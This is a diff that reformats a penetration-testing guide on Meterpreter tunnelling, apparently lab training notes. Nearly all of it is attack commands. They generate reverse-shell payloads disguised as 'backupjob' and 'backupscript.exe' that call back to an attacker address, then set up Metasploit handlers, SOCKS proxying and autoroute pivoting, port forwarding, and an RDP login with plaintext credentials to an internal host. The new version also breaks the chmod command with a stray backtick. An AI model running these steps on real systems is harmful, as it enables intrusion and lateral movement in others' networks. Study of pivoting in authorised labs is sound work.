@@ -2,88 +2,104 @@
 legal-banner: true
 ---
 
-### **METERPRETER TUNNELING & PORT FORWARDING**
+### **Meterpreter Tunneling & Port Forwarding**
 
-We will cover the essential commands and steps for setting up Meterpreter port forwarding, This guide assumes you have a Meterpreter shell on an Ubuntu server (pivot host) and wish to perform enumeration scans through this host.
+This section covers the essential commands and steps for setting up Meterpreter port forwarding.  
+It assumes you already have a Meterpreter shell on an Ubuntu server (pivot host) and want to perform enumeration scans through this host.  
 
+### **Creating Payload for Ubuntu Pivot Host**
 
-### **CREATING PAYLOAD FOR UBUNTU PIVOT HOST**
+1. Generate payload:  
+   ```bash
+   msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f elf -o backupjob
+   ```
 
-1.  Generate Payload:  
-    `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080`
-    
-2.  Start multi/handler:
-    ```
-    msf6 > use exploit/multi/handler
-    msf6 exploit(multi/handler) > set lhost 0.0.0.0
-    msf6 exploit(multi/handler) > set lport 8080
-    msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
-    msf6 exploit(multi/handler) > run
-    ```
-    
-3.  Copy and Execute Payload on Pivot Host:  
-    `chmod +x backupjob $ ./backupjob`
-    
-4.  Verify Meterpreter Session:  
-    `meterpreter > pwd`
-    
+2. Start multi/handler:  
+   ```bash
+   msf6 > use exploit/multi/handler
+   msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+   msf6 exploit(multi/handler) > set LPORT 8080
+   msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
+   msf6 exploit(multi/handler) > run
+   ```
 
-### **CONFIGURING MSF SOCKS PROXY**
+3. Copy and execute payload on pivot host:  
+   ```bash
+   chmod `x backupjob && ./backupjob
+   ```
 
-1.  Start SOCKS Proxy:
-    
-    ```
-    msf6 > use auxiliary/server/socks_proxy
-    msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
-    msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
-    msf6 auxiliary(server/socks_proxy) > set version 4a
-    msf6 auxiliary(server/socks_proxy) > run
-    ```
-    
-2.  Add Line to proxychains.conf:  
-    `socks4 127.0.0.1 9050`
-    
-3.  Create Routes with AutoRoute:
-    
-    ```
-    msf6 > use post/multi/manage/autoroute
-    msf6 post(multi/manage/autoroute) > set SESSION 1
-    msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
-    msf6 post(multi/manage/autoroute) > run
-    ```
-    
+4. Verify Meterpreter session:  
+   ```bash
+   meterpreter > pwd
+   ```
 
-### **TESTING PROXY & ROUTING FUNCTIONALITY**
+### **Configuring MSF SOCKS Proxy**
 
-1.  Run Nmap Scan:  
-    `proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn`
-    
-2.  Local Port Forwarding:  
-    `meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19`
-    
-3.  Connecting to Target:  
-    `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`
-    
-4.  View Netstat:  
-    `netstat -antp`
-    
+1. Start SOCKS proxy:  
+   ```bash
+   msf6 > use auxiliary/server/socks_proxy
+   msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
+   msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
+   msf6 auxiliary(server/socks_proxy) > set VERSION 4a
+   msf6 auxiliary(server/socks_proxy) > run
+   ```
 
-### **REVERSE PORT FORWARDING**
+2. Add entry to proxychains.conf:  
+   ```bash
+   socks4 127.0.0.1 9050
+   ```
 
-1.  Add Reverse Port Forward:  
-    `meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18`
-    
-2.  Start multi/handler:
-    
-    ```
-    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
-    msf6 exploit(multi/handler) > set LPORT 8081
-    msf6 exploit(multi/handler) > set LHOST 0.0.0.0
-    msf6 exploit(multi/handler) > run
-    ```
-    
-3.  Generate Windows Payload:  
-    `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234`
-    
-4.  Establish Meterpreter Session:  
-    `meterpreter > shell`
+3. Create routes with AutoRoute:  
+   ```bash
+   msf6 > use post/multi/manage/autoroute
+   msf6 post(multi/manage/autoroute) > set SESSION 1
+   msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
+   msf6 post(multi/manage/autoroute) > run
+   ```
+
+### **Testing Proxy & Routing Functionality**
+
+1. Run an Nmap scan:  
+   ```bash
+   proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
+   ```
+
+2. Set up local port forwarding:  
+   ```bash
+   meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
+   ```
+
+3. Connect to the target:  
+   ```bash
+   xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+   ```
+
+4. View active connections with netstat:  
+   ```bash
+   netstat -antp
+   ```
+
+### **Reverse Port Forwarding**
+
+1. Add a reverse port forward:  
+   ```bash
+   meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+   ```
+
+2. Start multi/handler:  
+   ```bash
+   msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+   msf6 exploit(multi/handler) > set LPORT 8081
+   msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+   msf6 exploit(multi/handler) > run
+   ```
+
+3. Generate Windows payload:  
+   ```bash
+   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe -o backupscript.exe
+   ```
+
+4. Establish a Meterpreter session:  
+   ```bash
+   meterpreter > shell
+   ```
